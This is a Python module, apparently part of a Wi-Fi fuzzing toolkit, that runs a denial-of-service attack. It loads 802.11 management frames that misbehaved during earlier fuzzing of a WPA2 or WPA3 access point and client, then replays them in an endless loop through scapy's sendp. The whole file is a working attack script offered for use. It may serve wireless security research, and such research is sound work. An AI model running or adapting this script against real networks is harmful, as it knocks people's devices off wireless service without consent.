from scapy.all import sendp
from NIC_init import *
from Frame_types.Construct_frame_fields import NUM_OF_FRAMES_TO_SEND, bcolors
from ascii_art import dos_attack, wifi
import os
import codecs
import subprocess

print(dos_attack)
print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
print('\t\tThis module launches a DoS attack based on the data collected from the fuzzing process.\n\t\tIt can only be exploited against the same AP and STA that were used it the fuzzing procedure.\n\t\tFrames that caused any kind of problematic behaviour during the fuzzing are being transmited\n\t\tendlessly during the DoS attack.\n\n')
print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
input('Press enter to initiate the attack: ')
initiate_NIC()
sleep(3)

current_dir = os.getcwd()
file_list = os.listdir(current_dir + "/Logs/fuzz_mngmt_frames")
chosen_files_list = []
frames_list = []
subprocess.call(['clear'], shell=True)
print(dos_attack)
print(wifi)
AP_sec_choice = int(input("Attack choices\n1)WPA3\n2)WPA2\nPick your choice: "))
if AP_sec_choice == 1:
    for file in file_list:
        if 'WPA3' in file:
            chosen_files_list.append(file)
elif AP_sec_choice == 2:
    for file in file_list:
        if 'WPA2' in file:
            chosen_files_list.append(file)
else:
    print("No such choice :(")
    os._exit(0)
if not chosen_files_list:
    print("No attack vectors found for the choice you made :(")
    os._exit(0)
else:
    pass
for files in chosen_files_list:
    with open(current_dir + "/Logs/fuzz_mngmt_frames/" + files, 'r') as f:
        for line in f:
            if "frame = " in line:
                temp = line.strip("frame = \nb'")
                try:
                    frames_list.append(temp.encode().decode('unicode_escape').encode("raw_unicode_escape"))
                except:
                    pass
print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
print(bcolors.OKGREEN + "Executing the attack...." + bcolors.ENDC)
print(bcolors.OKGREEN + "Stop the attack with Ctrl+c" + bcolors.ENDC)
print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
while True:
    for frame in frames_list:
        sendp(frame, count=NUM_OF_FRAMES_TO_SEND, iface=att_interface, verbose=0)
